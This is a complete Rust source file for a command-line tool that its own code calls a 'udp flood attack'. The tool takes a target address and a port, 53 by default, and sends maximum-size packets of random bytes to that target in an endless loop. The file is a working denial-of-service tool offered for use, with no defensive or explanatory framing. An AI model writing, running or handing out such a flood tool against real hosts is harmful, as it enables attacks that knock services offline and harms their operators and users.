use clap::{Arg, App};
use std::net::UdpSocket;
use rand::Rng;

const PORT: u32 = 53;
const BUF_SIZE: usize = 65507;

fn flood(addr: String, port: u32) {
    let mut buf = [0 as u8; BUF_SIZE];
    let mut rng = rand::thread_rng();
    for i in 0..BUF_SIZE { buf[i] = rng.gen() };

    loop {
        let src = format!("{}:{}", addr, port);
        let socket = UdpSocket::bind("0.0.0.0:0").unwrap();

        socket.send_to(&buf, &src).unwrap();
    }
}

fn main() {
    let matches = App::new("udp flood attack")
        .author("Thomas Campistron <irevoire@hotmail.fr>")
        .arg(Arg::with_name("address")
             .short("a")
             .long("addr")
             .takes_value(true)
             .required(true)
             .index(1))
        .arg(Arg::with_name("port")
             .short("p")
             .long("port")
             .takes_value(true))
        .get_matches();

    let addr = matches.value_of("address").unwrap().to_string();
    let port: u32 = match matches.value_of("port") {
        Some(p) => p.parse().unwrap(),
        None => PORT,
    };

    flood(addr, port);
}
